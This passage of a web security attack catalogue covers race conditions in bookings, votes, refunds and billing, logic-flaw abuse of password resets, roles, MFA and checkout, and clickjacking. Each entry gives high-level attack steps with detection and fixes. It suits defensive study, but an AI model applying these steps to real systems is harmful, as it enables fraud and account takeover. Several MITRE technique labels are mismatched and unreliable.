- **Scenario**: Attacker sends concurrent booking requests to reserve same seats before system updates availability.
- **Attack Steps**: Step 1: Attacker selects specific seats for a popular event on a ticketing website. Step 2: Sends multiple simultaneous reservation or purchase requests for the same seats. Step 3: If backend does not lock seat availability or use atomic seat assignment, multiple requests may succeed. Step 4: Leads to double booking or overbooking of seats. Step 5: This can cause customer dissatisfaction, refunds, and operational issues. Step 6: Detect by monitoring seat availability conflicts and concurrent bookings for same seats. Step 7: Fix by implementing transactional seat locks and atomic updates on seat inventory.
- **Detection**: Monitor for conflicting seat reservations; audit seat inventory in real-time
- **Solution**: Use database locks and atomic seat assignment during booking
- **Tags**: Race Condition, Ticket Overbooking

## Exploiting Race Condition in Voting or Polling Systems

- **Attack Type**: Race Condition / Vote Manipulation
- **Target**: Online Voting Platform
- **Vulnerability**: Missing atomic vote validation
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Vote manipulation, distorted results
- **Tools**: Burp Suite, scripting
- **Scenario**: Attacker submits multiple votes simultaneously to cast more votes than allowed or influence outcome.
- **Attack Steps**: Step 1: Attacker accesses an online voting or polling system with voting limits per user/IP. Step 2: Sends multiple voting requests at the same time, trying to submit more votes than allowed. Step 3: If system does not serialize vote recording or enforce atomic checks, multiple votes are accepted. Step 4: This skews voting results unfairly. Step 5: Detection involves monitoring IP or user voting frequency and duplicate votes. Step 6: Solution is to enforce atomic vote validation and recording, reject duplicate or concurrent votes from same user/IP.
- **Detection**: Detect multiple votes from same user/IP; monitor voting patterns
- **Solution**: Use transactional vote processing and rate limiting
- **Tags**: Race Condition, Vote Fraud

## Race in Loyalty Points Redemption to Receive Extra Rewards

- **Attack Type**: Race Condition / Points Abuse
- **Target**: Loyalty System
- **Vulnerability**: No atomic loyalty points balance update
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Financial loss, program abuse
- **Tools**: Burp Suite, scripting
- **Scenario**: Attacker redeems loyalty points multiple times by sending simultaneous redemption requests before balance updates.
- **Attack Steps**: Step 1: Attacker has a loyalty account with points balance. Step 2: Initiates multiple reward redemption requests almost simultaneously. Step 3: Backend fails to atomically update points balance before processing next request. Step 4: Multiple redemptions succeed, granting more rewards than points owned. Step 5: Detection requires monitoring rapid multiple redemptions from same account. Step 6: Fix by enforcing atomic updates to loyalty points balance and redemption logic to prevent double spending.
- **Detection**: Monitor loyalty redemptions for rapid repeated use
- **Solution**: Enforce locking and atomic balance checks during redemption
- **Tags**: Race Condition, Loyalty Abuse

## Race Condition in Session Token Generation for Session Hijacking

- **Attack Type**: Race Condition / Session Hijacking
- **Target**: Web Applications
- **Vulnerability**: Race condition in session token logic
- **MITRE**: T1539 – Steal Web Session Cookie
- **Impact**: Unauthorized session takeover, data exposure
- **Tools**: Burp Suite, intercepting proxy
- **Scenario**: The system generates session tokens but race conditions cause token reuse or token prediction, enabling attackers to hijack sessions.
- **Attack Steps**: Step 1: Attacker initiates login or session creation but quickly sends multiple requests simultaneously to the server to trigger session token generation. Step 2: Due to race condition, the server might issue duplicate or predictable session tokens for different users or requests. Step 3: Attacker captures a valid session token (e.g., via network sniffing, proxy). Step 4: Uses this token to impersonate another user by sending it with their requests (session hijacking). Step 5: Gains unauthorized access to victim’s session and data. Step 6: Detection requires monitoring for duplicate or reused session tokens and unusual session activity. Step 7: Fix by ensuring session tokens are generated atomically and uniquely per session request with proper randomness.
- **Detection**: Detect token reuse or duplicates, monitor session anomalies
- **Solution**: Implement atomic, unique, and cryptographically strong session token generation
- **Tags**: Race Condition, Session Hijacking

## Exploiting Race Conditions in Auction Bidding Logic

- **Attack Type**: Race Condition / Bid Manipulation
- **Target**: Auction Websites
- **Vulnerability**: No atomic bid update enforcement
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Unfair auction outcomes, financial loss
- **Tools**: Burp Suite, automation scripts
- **Scenario**: Attacker exploits race conditions to place multiple bids simultaneously, confusing highest bid logic and winning unfairly.
- **Attack Steps**: Step 1: Attacker identifies an auction system with real-time bid updates. Step 2: Sends several bids in rapid succession simultaneously for the same item. Step 3: Server processes bids in an inconsistent order due to race conditions, possibly accepting lower or duplicate bids as highest. Step 4: Attacker wins auction at a price lower than intended or blocks other bidders unfairly. Step 5: Detection includes monitoring bid timing and out-of-order bid acceptance. Step 6: Fix by enforcing transactional bid recording and locking highest bid updates atomically.
- **Detection**: Monitor bids for anomalies and timing irregularities
- **Solution**: Use atomic transactions and locks on bid processing
- **Tags**: Race Condition, Auction Manipulation

## Race Condition in Multi-User Document Editing Causing Data Loss

- **Attack Type**: Race Condition / Data Integrity
- **Target**: Collaborative Editing Apps
- **Vulnerability**: No concurrency control on document saves
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Data loss, corrupted or inconsistent documents
- **Tools**: Burp Suite, testing tools
- **Scenario**: Concurrent edits overwrite each other due to race conditions, causing loss of updates or corrupted data.
- **Attack Steps**: Step 1: Multiple users open and edit the same document concurrently. Step 2: Users save or submit their changes nearly simultaneously. Step 3: Server does not properly merge or lock document versions, so last write overwrites previous changes without conflict resolution. Step 4: Users lose edits made by others. Step 5: Detection includes audit logs showing overlapping edits without conflict handling. Step 6: Fix involves implementing version control, locking, or operational transformation algorithms to merge concurrent edits safely.
- **Detection**: Detect concurrent conflicting saves; log edit conflicts
- **Solution**: Implement version control, locking, or merge algorithms
- **Tags**: Race Condition, Data Loss

## Race Condition in Order Cancellation and Refund Systems

- **Attack Type**: Race Condition / Refund Fraud
- **Target**: E-commerce Systems
- **Vulnerability**: Missing atomic refund/cancellation logic
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Financial loss, refund fraud
- **Tools**: Burp Suite, scripting
- **Scenario**: Attacker exploits race conditions to cancel orders multiple times or obtain multiple refunds for a single order.
- **Attack Steps**: Step 1: Attacker places an order successfully. Step 2: Sends multiple simultaneous cancellation requests for the same order. Step 3: Server processes each request separately due to lack of atomic locking, issuing multiple refunds or marking order canceled multiple times. Step 4: Attacker receives more refunds than payments made. Step 5: Detection requires monitoring refund requests frequency and duplicates. Step 6: Fix by implementing atomic transaction locks on order cancellation and refund processing.
- **Detection**: Monitor for rapid duplicate refund requests; audit refund transaction logs
- **Solution**: Use atomic transaction locks and checks on cancellation and refunds
- **Tags**: Race Condition, Refund Fraud

## Race Condition in Financial Transaction Approvals

- **Attack Type**: Race Condition / Transaction Manipulation
- **Target**: Financial Applications
- **Vulnerability**: Lack of atomic transaction approval logic
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Monetary loss, accounting errors
- **Tools**: Burp Suite, automation tools
- **Scenario**: Attacker exploits race conditions to approve multiple conflicting or duplicate financial transactions.
- **Attack Steps**: Step 1: Attacker initiates a financial transaction requiring approval. Step 2: Sends multiple approval or transaction requests simultaneously. Step 3: Due to race conditions, multiple transactions may be approved or executed without proper sequencing. Step 4: Leads to double spending, duplicated transactions, or inconsistent balances. Step 5: Detection involves audit trails showing overlapping approvals or transactions. Step 6: Fix by implementing strict locking, transaction queues, and atomic approval processes.
- **Detection**: Audit transaction logs for concurrency conflicts; monitor unusual transaction patterns
- **Solution**: Use strict transaction locking and atomic approval processes
- **Tags**: Race Condition, Financial Fraud

## Exploiting Race Condition in Event Ticket Scalping Systems

- **Attack Type**: Race Condition / Scalping
- **Target**: Ticketing Platforms
- **Vulnerability**: Lack of atomic inventory update logic
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Financial loss, unfair ticket distribution
- **Tools**: Burp Suite, scripting
- **Scenario**: Attackers exploit race conditions in ticket buying to buy more tickets than allowed, reselling for profit.
- **Attack Steps**: Step 1: Attacker visits ticket purchase page during high-demand event. Step 2: Simultaneously sends multiple purchase requests very quickly (e.g., via automated scripts or Burp Suite intruder) before the system can update ticket inventory. Step 3: Due to race condition, the system sells more tickets than available or bypasses per-user purchase limits. Step 4: Attacker successfully purchases excess tickets. Step 5: Resells tickets at higher price, causing loss to legitimate buyers. Step 6: Detection includes monitoring unusually high purchase requests per user or IP and ticket inventory inconsistencies. Step 7: Fix by implementing atomic inventory updates and purchase limits enforced server-side with locking mechanisms.
- **Detection**: Monitor request bursts and inventory discrepancies
- **Solution**: Use atomic transactions and enforce strict per-user limits at server
- **Tags**: Race Condition, Ticket Scalping

## Race Condition Leading to Denial of Service via Resource Exhaustion

- **Attack Type**: Race Condition / DoS
- **Target**: Web Servers, APIs
- **Vulnerability**: Improper resource handling
- **MITRE**: T1499 – Resource Hijacking
- **Impact**: Service unavailability (DoS)
- **Tools**: Load testing tools
- **Scenario**: Attackers send multiple simultaneous requests causing resource exhaustion or service crash via race condition.
- **Attack Steps**: Step 1: Attacker identifies a server endpoint vulnerable to race conditions (e.g., file uploads, session creations). Step 2: Sends many concurrent requests simultaneously to this endpoint. Step 3: The server mishandles resource allocation or cleanup due to race condition, consuming excessive memory, CPU, or disk space. Step 4: Server becomes slow or crashes, denying service to legitimate users. Step 5: Detection involves monitoring server resource usage spikes and error rates. Step 6: Fix by implementing resource limits, request throttling, and atomic resource handling in code to avoid leaks.
- **Detection**: Monitor server resource spikes and error logs
- **Solution**: Implement rate limiting, resource quotas, and atomic resource management
- **Tags**: Race Condition, DoS

## Exploiting Race Condition in Inventory Restocking Logic

- **Attack Type**: Race Condition / Stock Manipulation
- **Target**: E-commerce Systems
- **Vulnerability**: No locking on stock update
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Overselling, inventory inconsistencies
- **Tools**: Burp Suite, scripting
- **Scenario**: Attackers exploit race conditions in restocking logic to create phantom inventory or bypass stock limits.
- **Attack Steps**: Step 1: Attacker monitors inventory management system or API. Step 2: Sends multiple concurrent restock or stock update requests for the same product. Step 3: Due to race condition, the system incorrectly updates stock counts (e.g., double-counts restocks or fails to decrement stock sold). Step 4: Attacker buys more items than actually in stock, causing overselling and customer dissatisfaction. Step 5: Detection includes stock level inconsistencies and audit logs showing overlapping stock updates. Step 6: Fix involves locking inventory updates and using transactional database operations for stock management.
- **Detection**: Audit stock update logs; monitor for stock discrepancies
- **Solution**: Use atomic transactions and locks on stock updates
- **Tags**: Race Condition, Inventory

## Race Condition in Multi-User Access to Shared Resources

- **Attack Type**: Race Condition / Data Corruption
- **Target**: Collaborative Apps
- **Vulnerability**: Missing concurrency control
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Data corruption, loss of user changes
- **Tools**: Testing tools, Burp Suite
- **Scenario**: Multiple users access and modify shared resources concurrently causing conflicts or data loss.
- **Attack Steps**: Step 1: Multiple users simultaneously access a shared resource (e.g., document, database record). Step 2: Each user submits changes concurrently without proper coordination. Step 3: Due to lack of locking or version control, updates overwrite or conflict, causing loss or corruption. Step 4: Users see inconsistent or stale data. Step 5: Detection via user reports, audit logs, or automated checks showing conflicting writes. Step 6: Fix by implementing concurrency control mechanisms like locks, optimistic concurrency, or operational transformation algorithms.
- **Detection**: Monitor conflicting writes; user feedback on data inconsistencies
- **Solution**: Use locking, versioning, and merge algorithms
- **Tags**: Race Condition, Data Corruption

## Exploiting Race Conditions in Automated Billing Systems

- **Attack Type**: Race Condition / Billing Fraud
- **Target**: Billing Systems
- **Vulnerability**: Missing atomic transaction control
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Financial loss, billing errors
- **Tools**: Burp Suite, automation
- **Scenario**: Attackers exploit race conditions to generate duplicate or manipulated billing transactions.
- **Attack Steps**: Step 1: Attacker triggers billing system transaction requests rapidly and concurrently. Step 2: The system processes requests without atomic checks, causing duplicate bills or incorrect charge amounts. Step 3: Attacker either avoids paying or causes double charges. Step 4: Detection via billing audits showing duplicate or inconsistent transactions. Step 5: Fix by implementing atomic transaction processing, unique transaction IDs, and reconciliation checks.
- **Detection**: Audit transaction logs; detect duplicate or conflicting bills
- **Solution**: Use atomic transaction processing and unique IDs
- **Tags**: Race Condition, Billing Fraud

## Abuse of Password Reset via Logic Flaws

- **Attack Type**: Authentication Bypass
- **Target**: User Accounts
- **Vulnerability**: Weak or missing password reset validation
- **MITRE**: T1110 – Credential Stuffing / Bypass
- **Impact**: Account takeover, identity theft
- **Tools**: Burp Suite, browser devtools
- **Scenario**: Attackers exploit flawed password reset logic to reset passwords without proper validation and take over accounts.
- **Attack Steps**: Step 1: Attacker navigates to the “Forgot Password” page of the target app. Step 2: Attacker enters victim’s username or email. Step 3: Due to flawed logic (e.g., no email verification or weak token checks), attacker can reset password without owning email access. Step 4: Attacker submits reset request and sets a new password directly or reuses a predictable reset token. Step 5: Attacker logs in as victim with the new password. Step 6: Repeats the process for multiple accounts or automates it. Step 7: Detection involves monitoring multiple reset requests from same IP, unusual password changes, or failed email validations. Step 8: Fix by enforcing secure token generation, email verification, expiration times, and rate limiting on reset requests.
- **Detection**: Monitor password reset requests and token usage
- **Solution**: Enforce strong token validation, email verification, rate limits on resets
- **Tags**: Password Reset, Logic Flaw

## Multi-Account Abuse for Referral Bonuses

- **Attack Type**: Business Logic Abuse
- **Target**: Referral / Signup Systems
- **Vulnerability**: Lack of identity validation
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Financial loss, reward system abuse
- **Tools**: Automation scripts
- **Scenario**: Attackers create multiple accounts to repeatedly claim referral bonuses or signup incentives fraudulently.
- **Attack Steps**: Step 1: Attacker signs up for a referral program. Step 2: Creates multiple fake accounts or bots. Step 3: Uses each fake account to claim referral bonuses or signup rewards repeatedly. Step 4: Exploits missing checks on unique identity (e.g., no phone/email verification, IP restrictions). Step 5: Withdraws or monetizes rewards. Step 6: Detection involves monitoring multiple accounts from same IP/device, repetitive reward claims, or suspicious behavior. Step 7: Fix by enforcing strict identity verification, IP/device rate limiting, and referral bonus limits per real user.
- **Detection**: Analyze user signup patterns and reward claims
- **Solution**: Use CAPTCHA, phone/email verification, device fingerprinting
- **Tags**: Referral Abuse, Logic Flaw

## Manipulating User Roles by Skipping Authorization Steps

- **Attack Type**: Privilege Escalation
- **Target**: Web App Backend
- **Vulnerability**: Missing or weak authorization checks
- **MITRE**: T1078 – Valid Accounts
- **Impact**: Privilege escalation, data breach
- **Tools**: Proxy tools, Burp Suite
- **Scenario**: Attackers bypass authorization checks to assign themselves higher user roles or access restricted features.
- **Attack Steps**: Step 1: Attacker logs in as normal user. Step 2: Using proxy or browser devtools, attacker modifies requests or parameters related to roles or permissions (e.g., changes role=“user” to role=“admin”). Step 3: Due to missing or improper backend validation, server accepts the manipulated role. Step 4: Attacker gains admin or elevated privileges. Step 5: Exploits admin features (view/edit sensitive data). Step 6: Detection involves monitoring role changes, access logs for abnormal actions by normal users. Step 7: Fix by enforcing server-side authorization checks on every privileged action and rejecting client-supplied role changes.
- **Detection**: Monitor access logs and role changes
- **Solution**: Enforce server-side role checks; never trust client input for roles
- **Tags**: Authorization Bypass, Logic Flaw

## Unauthorized Access to Admin Functions via Logic Errors

- **Attack Type**: Access Control Bypass
- **Target**: Admin Panel / Backend
- **Vulnerability**: Missing or broken access controls
- **MITRE**: T1078 – Valid Accounts
- **Impact**: Unauthorized admin access, data manipulation
- **Tools**: Burp Suite, fuzzers
- **Scenario**: Attackers access admin-only functions due to broken or missing access control logic on backend endpoints.
- **Attack Steps**: Step 1: Attacker enumerates backend endpoints using tools or manual browsing. Step 2: Tests access to admin endpoints without proper authentication (e.g., /admin/deleteUser). Step 3: If access control is missing, attacker performs admin functions like deleting users or changing settings. Step 4: Gains unauthorized control over application features. Step 5: Detection includes access log anomalies and unexpected admin actions. Step 6: Fix by implementing strict role-based access control on all sensitive endpoints and validating user privileges server-side.
- **Detection**: Log and alert on unauthorized admin endpoint access
- **Solution**: Implement robust RBAC, validate privileges on server for every sensitive action
- **Tags**: Access Control, Logic Flaw

## Abuse of Account Deletion and Recreation for Data Persistence

- **Attack Type**: Business Logic Flaw
- **Target**: User Accounts
- **Vulnerability**: Incomplete data deletion and validation
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Data persistence abuse, evasion of limits
- **Tools**: Browser devtools, scripts
- **Scenario**: Attackers delete and recreate accounts repeatedly to evade data limits or persist data maliciously.
- **Attack Steps**: Step 1: Attacker deletes their account to remove bad history or reset counters. Step 2: Re-registers a new account with same details or slight variations. Step 3: Exploits weak deletion logic where associated data is not fully cleaned or restrictions reset. Step 4: Repeats deletion and recreation to persist unwanted data, bypass limits, or avoid bans. Step 5: Detection involves monitoring account deletion/recreation frequency and residual data. Step 6: Fix by ensuring complete data cleanup on deletion, linking accounts uniquely, and limiting recreation from same user/device/IP.
- **Detection**: Audit account lifecycle events
- **Solution**: Ensure thorough data deletion; implement recreation limits and user/device linkage
- **Tags**: Account Abuse, Logic Flaw

## Exploiting Logic Flaws in API Rate Limiting

- **Attack Type**: Rate Limiting Bypass
- **Target**: APIs
- **Vulnerability**: Weak or missing global rate limiting
- **MITRE**: T1499 – Endpoint Denial of Service
- **Impact**: Resource exhaustion, account lockout
- **Tools**: Burp Suite, Postman, scripts
- **Scenario**: Attackers bypass rate limiting rules in APIs to make excessive requests, causing abuse or DoS.
- **Attack Steps**: Step 1: Attacker identifies an API endpoint with rate limiting (e.g., login attempts limited to 5 per minute). Step 2: Tests the rate limit by sending multiple requests manually or with Burp Suite Intruder to confirm limits. Step 3: Looks for logic flaws such as rate limit applied per IP, but attacker uses many IPs (IP rotation) or changes User-Agent headers. Step 4: Exploits gaps where rate limiting resets too early or only counts certain requests. Step 5: Sends a large volume of requests exceeding intended limits, e.g., brute forcing login or scraping data. Step 6: Detection involves monitoring unusual request spikes, failed logins, or IP rotation patterns. Step 7: Fix by applying global rate limits, using stronger client identification, and combining multiple rate limiting strategies.
- **Detection**: Monitor request rate anomalies, IP/User-Agent changes
- **Solution**: Implement per-user, per-IP, and global rate limiting; add CAPTCHA on suspicious activity
- **Tags**: Rate Limiting, Logic Flaw

## Forced Password Change Bypass via Logic Errors

- **Attack Type**: Authentication Bypass
- **Target**: User Accounts
- **Vulnerability**: Missing enforcement in password change flow
- **MITRE**: T1110 – Credential Stuffing / Bypass
- **Impact**: Unauthorized access
- **Tools**: Burp Suite, browser tools
- **Scenario**: Attackers bypass enforced password change policies due to flawed logic in password reset or change flows.
- **Attack Steps**: Step 1: Attacker triggers a forced password change flow (e.g., after first login or password expiration). Step 2: Intercepts the password change request using proxy tools. Step 3: Identifies logic flaws where password change can be bypassed by skipping or manipulating parameters (e.g., missing server-side check if new password was provided). Step 4: Submits requests to login or continue without changing password. Step 5: Gains access to the account without fulfilling password change requirements. Step 6: Detection requires monitoring incomplete password change flows or logins without password change events. Step 7: Fix by enforcing server-side checks ensuring password change completion before granting access.
- **Detection**: Log password change events, flag bypass attempts
- **Solution**: Enforce server-side checks requiring password update before access
- **Tags**: Password Policy, Logic Flaw

## Exploiting Logic Bugs in Multi-Currency Wallets

- **Attack Type**: Business Logic Abuse
- **Target**: Payment Systems
- **Vulnerability**: Flawed currency logic/validation
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Financial theft or corruption
- **Tools**: Burp Suite, Postman
- **Scenario**: Attackers manipulate currency conversion or balance updates to gain extra funds or cause errors.
- **Attack Steps**: Step 1: Attacker accesses wallet or payment API supporting multiple currencies. Step 2: Observes how currency conversion and balance updates are handled (e.g., conversion rates, rounding). Step 3: Tests by submitting transactions or transfers with mixed currency parameters or invalid values. Step 4: Finds logic bugs like double conversion, missing validation, or negative balance acceptance. Step 5: Exploits by creating transactions that credit more money or avoid debits. Step 6: Repeats or automates the attack to drain funds or manipulate balances. Step 7: Detection includes balance anomalies, conversion mismatches, or unusual transaction patterns. Step 8: Fix by validating all currency operations server-side, using trusted conversion APIs, and adding consistency checks.
- **Detection**: Monitor transaction logs and balance changes
- **Solution**: Use strict server-side validation, trusted conversion services, and audit trails
- **Tags**: Business Logic, Currency Abuse

## Abuse of Subscription Cancellation and Renewal Loopholes

- **Attack Type**: Business Logic Abuse
- **Target**: Subscription Services
- **Vulnerability**: Flawed subscription state logic
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Revenue loss, unauthorized free service
- **Tools**: Browser tools, scripts
- **Scenario**: Attackers abuse flaws in subscription handling to get services for free or extend trials indefinitely.
- **Attack Steps**: Step 1: Attacker subscribes to a service trial or paid subscription. Step 2: Cancels subscription before renewal but exploits logic that allows immediate renewal or grace periods. Step 3: Uses loopholes to reset trial periods by deleting/recreating accounts or changing payment info. Step 4: Manipulates cancellation timing to avoid charges while retaining service access. Step 5: Repeats the cycle to get prolonged or free access. Step 6: Detection involves monitoring frequent cancellations, renewals, and account recreations. Step 7: Fix by enforcing proper subscription state tracking, blocking immediate reuse of trials, and verifying payment before renewal.
- **Detection**: Analyze subscription lifecycle events and payment records
- **Solution**: Enforce cooldown periods, track user identities, validate payment before renewal
- **Tags**: Subscription Abuse, Logic Flaw

## Manipulating Checkout Flow to Avoid Tax Calculation

- **Attack Type**: Business Logic Bypass
- **Target**: E-commerce Checkout
- **Vulnerability**: Missing validation on tax fields
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Financial loss, tax evasion
- **Tools**: Burp Suite, browser devtools
- **Scenario**: Attackers manipulate checkout or payment flow parameters to skip tax calculation or reduce payment amount.
- **Attack Steps**: Step 1: Attacker goes through checkout process on e-commerce site. Step 2: Intercepts HTTP requests with Burp Suite or browser devtools. Step 3: Modifies parameters like “tax_amount”, “apply_tax”, or “country” to invalid or zero values. Step 4: Observes system accepting the tampered values without recalculation or validation. Step 5: Completes checkout paying less tax or no tax. Step 6: Detection involves auditing payment records, tax reports, and anomalous transactions. Step 7: Fix by enforcing server-side tax calculations based on trusted data, ignoring client-supplied tax fields.
- **Detection**: Monitor transaction irregularities and tax discrepancies
- **Solution**: Calculate tax only server-side; ignore client input for pricing/tax parameters
- **Tags**: Checkout Abuse, Logic Flaw

## Exploiting Logic Flaws in Gift Registry Systems

- **Attack Type**: Business Logic Abuse
- **Target**: Gift Registry Systems
- **Vulnerability**: Missing or weak authorization
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Theft, denial of service (gift loss)
- **Tools**: Burp Suite, browser tools
- **Scenario**: Attackers manipulate gift registry workflows to claim, modify, or delete gifts improperly for personal gain.
- **Attack Steps**: Step 1: Attacker registers or accesses a gift registry on an e-commerce or event website. Step 2: Observes the process of adding, modifying, or claiming gifts. Step 3: Uses intercepting proxies (e.g., Burp Suite) to capture and modify HTTP requests. Step 4: Identifies logic flaws like missing authorization checks when modifying or claiming gifts (e.g., attacker can modify someone else’s gift). Step 5: Modifies request parameters such as gift ID, user ID, or claim status to illegitimately claim or delete gifts. Step 6: Confirms that changes are accepted by the system without proper validation. Step 7: Uses this to deprive intended recipients or steal gift credit. Step 8: Detection involves monitoring unusual gift modifications or claims from different accounts or IPs. Step 9: Fix by enforcing strict server-side authorization and validation on all gift registry actions.
- **Detection**: Monitor gift modification logs; alert for cross-account changes
- **Solution**: Validate user permissions server-side before allowing changes
- **Tags**: Gift Registry, Logic Flaw

## Business Logic Errors in Multi-Step Approval Workflows

- **Attack Type**: Workflow Bypass
- **Target**: Approval Workflows
- **Vulnerability**: Incomplete workflow validation
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Unauthorized actions approved
- **Tools**: Burp Suite, Postman
- **Scenario**: Attackers bypass or manipulate multi-step approval processes to approve unauthorized actions or changes.
- **Attack Steps**: Step 1: Attacker identifies a multi-step approval process (e.g., purchase approval, account creation). Step 2: Intercepts requests at each step using proxy tools. Step 3: Observes how state transitions occur between steps (e.g., status flags like approved = false). Step 4: Finds logic flaws such as missing checks on previous approvals or ability to skip steps. Step 5: Modifies request parameters or forges requests to jump approval steps or approve themselves. Step 6: Bypasses intended authorization causing unauthorized actions to be accepted. Step 7: Confirms unauthorized approval actions succeeded. Step 8: Detection requires auditing workflow step transitions and validation errors. Step 9: Fix by enforcing server-side validation of workflow state and step sequence.
- **Detection**: Audit workflow logs and state changes
- **Solution**: Implement strict step-by-step server-side workflow enforcement
- **Tags**: Workflow Bypass, Logic Flaw

## Abuse of Automated Email Verification Logic

- **Attack Type**: Authentication Bypass
- **Target**: User Registration
- **Vulnerability**: Weak email verification logic
- **MITRE**: T1110 – Credential Bypass
- **Impact**: Account takeover, fake accounts
- **Tools**: Burp Suite, browser devtools
- **Scenario**: Attackers abuse weak email verification flows to bypass email confirmation or create fake verified accounts.
- **Attack Steps**: Step 1: Attacker registers an account requiring email verification. Step 2: Intercepts the verification request or token using a proxy tool. Step 3: Analyzes if the verification process can be bypassed (e.g., by directly calling the post-verification endpoint without token). Step 4: Tries to reuse verification tokens multiple times or modify them to verify multiple accounts. Step 5: Finds flaws like tokens not expiring or no server-side validation of tokens. Step 6: Creates fully verified accounts without access to the email inbox or bypasses verification entirely. Step 7: Detection involves tracking token reuse, unverified accounts gaining privileges, or abnormal verification activity. Step 8: Fix by enforcing one-time, expiring tokens, and validating tokens server-side before marking verified.
- **Detection**: Monitor token usage and verification events
- **Solution**: Use secure, expiring tokens; validate on server before marking verified
- **Tags**: Email Verification, Logic Flaw

## Exploiting Logic Flaws in Digital Content Licensing

- **Attack Type**: License Abuse
- **Target**: Digital Content Systems
- **Vulnerability**: Weak or missing license checks
- **MITRE**: T1609 – Business Logic Abuse
- **Impact**: Revenue loss, copyright violation
- **Tools**: Burp Suite, Postman
- **Scenario**: Attackers bypass digital content license checks to access or distribute content without paying or authorization.
- **Attack Steps**: Step 1: Attacker accesses digital content platform (e.g., ebooks, videos) with licensing enforcement. Step 2: Monitors how license checks are enforced (e.g., via tokens, session flags). Step 3: Intercepts license validation requests and responses with a proxy tool. Step 4: Identifies flaws like missing validation on license tokens, or client-side only license checks. Step 5: Modifies requests or tokens to trick the system into allowing unauthorized access. Step 6: Downloads or streams content without a valid license. Step 7: May share or redistribute content illegally. Step 8: Detection involves usage pattern analysis and license validation failures. Step 9: Fix by enforcing server-side license validation and strong token protections.
- **Detection**: Monitor license validation logs and anomalies
- **Solution**: Enforce license validation server-side; secure token generation and validation
- **Tags**: Content Licensing, Logic Flaw

## Abuse of Logic in Multi-Factor Authentication Enrollment

- **Attack Type**: Authentication Bypass
- **Target**: User Accounts
- **Vulnerability**: Flawed MFA enrollment logic
- **MITRE**: T1110 – Authentication Bypass
- **Impact**: Account takeover, reduced security
- **Tools**: Burp Suite, browser tools
- **Scenario**: Attackers abuse flaws in MFA enrollment to avoid second factor or enroll devices without authorization.
- **Attack Steps**: Step 1: Attacker attempts to enroll a second factor (e.g., phone, app) during account setup or security settings. Step 2: Intercepts enrollment requests and responses. Step 3: Finds logic flaws where attacker can skip MFA enrollment steps or enroll devices for other users. Step 4: Modifies parameters like user ID or enrollment status to bypass or control MFA setup. Step 5: Gains access to accounts without proper MFA protection or adds their own factors. Step 6: May use this to bypass MFA or maintain persistent access. Step 7: Detection requires monitoring MFA enrollment logs and unusual device enrollments. Step 8: Fix by enforcing strict server-side validation of enrollment requests and user identity.
- **Detection**: Monitor MFA enrollment attempts and device additions
- **Solution**: Implement strong server-side MFA enrollment validation and audit
- **Tags**: MFA Abuse, Logic Flaw

## Iframe Embedding Without X-Frame-Options Header

- **Attack Type**: Clickjacking / UI Redressing
- **Target**: Web apps, user accounts
- **Vulnerability**: Missing clickjacking protection
- **MITRE**: T1185 – UI Redressing
- **Impact**: Unauthorized actions, data theft
- **Tools**: Browser devtools, Burp Suite
- **Scenario**: The website allows its pages to be embedded in iframes without restrictions, enabling clickjacking attacks.
- **Attack Steps**: Step 1: Attacker creates a malicious website embedding the target website inside an <iframe>. Step 2: Because the target site doesn’t send the X-Frame-Options header, browsers allow embedding. Step 3: Attacker overlays transparent or disguised UI elements over the iframe so that when a victim clicks something innocent (like a button), it actually clicks a hidden button on the target site (e.g., “Delete Account”). Step 4: Victim visits attacker’s site and unknowingly performs harmful actions on the target site. Step 5: Attacker tracks success by observing if victim’s account or data changes via out-of-band methods (emails, alerts). Step 6: This attack can be automated or targeted using social engineering to lure victims. Step 7: Detection includes monitoring unexpected actions and checking for missing X-Frame-Options headers on sensitive pages. Step 8: Fix by adding X-Frame-Options: DENY or SAMEORIGIN header to prevent framing or using CSP frame-ancestors directive.
- **Detection**: Monitor logs for unusual user actions
- **Solution**: Implement X-Frame-Options header or CSP frame-ancestors to block unauthorized framing
- **Tags**: Clickjacking, UI Redressing

## UI Redressing with Fake CAPTCHA Overlays

- **Attack Type**: UI Redressing
- **Target**: Websites with CAPTCHA
- **Vulnerability**: UI manipulation vulnerabilities
- **MITRE**: T1185 – UI Redressing
- **Impact**: Unauthorized actions, fraud
- **Tools**: HTML, CSS, JS, Burp Suite
- **Scenario**: Attacker overlays fake CAPTCHA UI to trick users into clicking hidden elements or perform actions unknowingly.
- **Attack Steps**: Step 1: Attacker creates a fake CAPTCHA overlay mimicking a real CAPTCHA on a malicious webpage. Step 2: Underneath the fake CAPTCHA is a transparent iframe or hidden element from a sensitive target site. Step 3: When the victim tries to “solve” the fake CAPTCHA, they actually click buttons or links on the target site unknowingly (e.g., authorize payments). Step 4: The attacker may also use JavaScript to prevent the victim from interacting with the real page elements, forcing them to interact with the malicious overlay. Step 5: Victim submits the fake CAPTCHA, but actually triggers the hidden actions on the target site. Step 6: The attacker captures these actions remotely, potentially gaining unauthorized access or transactions. Step 7: Detection involves user behavior analysis and scanning for UI inconsistencies or overlays. Step 8: Fix by validating origins and preventing framing of sensitive pages.
- **Detection**: User reports of suspicious transactions
- **Solution**: Implement anti-clickjacking headers and use CAPTCHA that can’t be spoofed easily
- **Tags**: CAPTCHA abuse, UI Redressing

## Clickjacking Using Transparent Overlays on Buttons

- **Attack Type**: Clickjacking
- **Target**: Web apps, critical UI
- **Vulnerability**: Missing frame protection
- **MITRE**: T1185 – UI Redressing
- **Impact**: Unauthorized commands executed
- **Tools**: Burp Suite, Browser Devtools
- **Scenario**: Transparent elements cover legitimate buttons, causing user clicks to trigger hidden actions on other sites.
